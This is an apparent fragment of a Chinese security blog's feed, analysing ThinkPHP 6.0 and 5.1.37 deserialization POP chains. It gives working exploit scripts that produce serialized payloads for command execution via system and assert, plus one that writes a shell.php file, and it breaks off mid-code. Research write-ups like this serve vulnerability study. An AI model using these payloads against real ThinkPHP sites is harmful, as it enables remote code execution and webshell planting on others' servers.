class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进toJson-&gt;toArray方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/6.png" alt="" loading="lazy"></p><p>这里需要执行到getAttr方法，需要满足其中一个$data的key和$this-&gt;visible的key相同，既可以触发getAttr方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getAttr</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// key = name</span><span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$value</span>    <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// whoami</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvalidArgumentException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isRelationAttr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$value</span>    <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// fanxing  whoami</span><span class="token punctuation">}</span></code></pre><p>跟进getData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/7.png" alt="" loading="lazy"></p><p>这里$fieldName的键要存在于$this-&gt;data数组中，而$fieldName时通过getRealFieldName获取的</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getRealFieldName</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">strict</span> <span class="token operator">?</span> <span class="token variable">$name</span> <span class="token punctuation">:</span> Str<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">snake</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>满足$this-&gt;strict为true就返回传递进来的值。最后又回到getAttr方法中</p><pre class=" language-php"><code class="language-php"><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>经过上面的分析，这里满足$name和$value可控，跟进getValue方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/8.png" alt="" loading="lazy"></p><p>漏洞触发点在圈起的地方，这里value可控，只需要满足$closure可控就可以rce，看上行代码，$this-&gt;withAttr是可控的，$fieldName是经过getRealFieldName方法获得的，也是可控的，最后，整个pop链就分析完了。</p><h4 id="pop链流程"><a href="#pop链流程" class="headerlink" title="pop链流程"></a><strong>pop链流程</strong></h4><p>这里利用下<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md" target="_blank" rel="noopener">Mochazz</a>的pop链分析图片</p><p><img src="https://raw.githubusercontent.com/Mochazz/ThinkPHP-Vuln/master/ThinkPHP6/ThinkPHP6.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/4.png" alt="" loading="lazy"></p><h4 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a><strong>EXP编写</strong></h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span><span class="token keyword">trait</span> <span class="token class-name">Conversion</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">trait</span> <span class="token class-name">Attribute</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Attribute</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Conversion</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$lazySave</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$exists</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$field</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$schema</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$visible</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">visible</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'111'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/9.png" alt="" loading="lazy"></p><p>tp6.0反序列还有其他链，复制下<a href="http://hed9eh0g.top/?p=217" target="_blank" rel="noopener">Hed9eh0g</a>这条链写入文件的poc</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$autosave</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>AbstractCache</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Adapter</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapter</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">"shell.php"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">adapter</span> <span class="token operator">=</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Local</span>     <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$writeFlags</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//对应file_put_contents的第三个参数</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token variable">$local</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>Local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">(</span><span class="token variable">$local</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X反序列化利用链.md" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X反序列化利用链.md</a></p><p>2.<a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2反序列化/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2反序列化/</a></p><p>3.<a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x反序列化/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x反序列化/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;&lt;strong&gt;环境搭建&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;安装tp6.0&lt;/p&gt;
&lt;pre class=&quot; language-shell&quot;&gt;&lt;cod
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.1.x反序列化链分析</title>
    <link href="http://yoursite.com/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-09T09:44:33.456Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h4><p>利用composer下载tp5.1.37的环境</p><pre class=" language-shell"><code class="language-shell">composer create-project --prefer-dist topthink/think thinkphp5.1.37cd thinkphp5.1.37修改composer.json文件里的为：topthink/framework": "5.1.37保存退出执行：composer update</code></pre><p>要进行反序列化攻击，需要可控的unserialize，在index控制器中写入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>    </code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p>这条链的前面部分跟tp5.0.24那条链一样，先全局查找__destruct魔术方法，找到文件<code>/thinkphp/library/think/process/pipes/Windows.php</code></p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进removeFiles方法，file_exists函数执行会把里里面的参数当做字符串，所以可以调用__toString魔术方法。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里，全局查找__toString，这里存在两条链，我们利用<code>\thinkphp\library\think\model\concern\Conversion.php</code>这条链来构造，这里要怎么调用到__toString方法，而Conversion类是trait关键字声明的，无法被实例化。在类中，可以使用use关键字来继承这个Conversion类，全局查找Conversion类，发现<code>\thinkphp\library\think\Model.php</code></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/1.png" alt="" loading="lazy"></p><p>抽象类不能被实例化，需要找他的子类，发现<code>\thinkphp\library\think\model\Pivot.php</code>，所以payload为：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre><p>继续跟进__toString魔术方法中toJson-&gt;toArray()方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/2.png" alt="" loading="lazy"></p><p>当$relation可控的时候可以触发__call方法，这里，$this-&gt;append可控就代表key和name可控，跟进getRelation方法看一下</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/3.png" alt="" loading="lazy"></p><p>当条件语句都不满足无任何返回，就继续跟进getAttr方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/4.png" alt="" loading="lazy"></p><p>这里始终都会执行getData，跟进这个函数</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/5.png" alt="" loading="lazy"></p><p>$this-&gt;data可控，就代表$relation变量可控，所以就可以触发__call方法，全局查找一下。这里可以利用tprce那个那个类来触发命令执行。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/6.png" alt="" loading="lazy"></p><p>这里$this-&gt;hook[$method]是可控，而array_unshift函数会在$args数组前插入新元素，所以导致$args不可控，分析过tp5rce的都知道filterValue方法存在call_user_func可以构造rce。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/7.png" alt="" loading="lazy"></p><p>这里，怎么执行到filterValue，该类的input方法可以调用，但是input方法的参数不可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/8.png" alt="" loading="lazy"></p><p>需要查找哪里调用input方法了，发现param调用了input</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/9.png" alt="" loading="lazy"></p><p>这里$this-&gt;param可控，而name不可控，又需要查找哪里调用param方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isAjax</span><span class="token punctuation">(</span><span class="token variable">$ajax</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$value</span>  <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">server</span><span class="token punctuation">(</span><span class="token string">'HTTP_X_REQUESTED_WITH'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string">'xmlhttprequest'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token operator">===</span> <span class="token variable">$ajax</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$result</span>           <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'var_ajax'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mergeParam</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>找到isAjax方法，$this-&gt;config可控，就代表param方法中的name参数可控，就代表input方法中data，name参数都可控，继续回到input方法查看第1373行，在filterValue方法$filters参数要可控</p><pre class=" language-php"><code class="language-php"><span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>跟进getFilter方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/10.png" alt="" loading="lazy"></p><p>$this-&gt;filter可控就代表了filterValue方法$filters参数可控，所以组合起来，poc如下</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token string">"123456"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Request</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$param</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$hook</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"assert"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"var_ajax"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"visible"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"phpinfo()"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token 